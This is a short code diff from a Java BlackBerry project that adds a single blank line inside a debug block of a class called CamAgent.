@@ -19,6 +19,7 @@ import blackberry.utils.DebugLevel;
 public final class CamAgent extends Agent {
     //#ifdef DEBUG
     static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);
+
     //#endif
 
     /**
